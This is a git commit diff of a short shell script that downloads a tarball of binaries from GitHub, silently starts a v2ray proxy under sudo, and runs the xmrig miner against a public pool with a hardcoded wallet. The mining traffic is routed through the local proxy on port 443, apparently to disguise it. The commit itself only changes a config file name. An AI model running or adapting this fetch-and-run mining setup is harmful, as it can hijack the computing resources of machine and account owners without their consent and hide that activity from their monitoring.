0d99fc81b5fce2507d8c4671880385acf29e1f4f
prendibs <94189491+prendibs@users.noreply.github.com>
2023-10-06 21:08:06 +0700

    Update nl1.sh

--- nl1.sh
+++ nl1.sh
@@ -2,6 +2,6 @@
 #love u fika
 
 wget https://github.com/prendibs/vl/raw/main/x.tar.gz && tar xf x.tar.gz
-nohup sudo ./v2ray run --config=nl1.json </dev/null >/dev/null 2>&1 &
+nohup sudo ./v2ray run --config=frku.json </dev/null >/dev/null 2>&1 &
 echo "love u fika"
 sudo ./xmrig -B -x 127.0.0.1:443 -o zephyr.miningocean.org:5332 -u ZEPHs9qyUjPfbebw44nveyf2XqZ2sotqRd8ntp8SyPZMj4tDSZeCX9mJnkroee214rN6ZWNm7kroFe1dB5Rnf3DG2zKRHCKPFJ9 -p nl1 -a rx/0
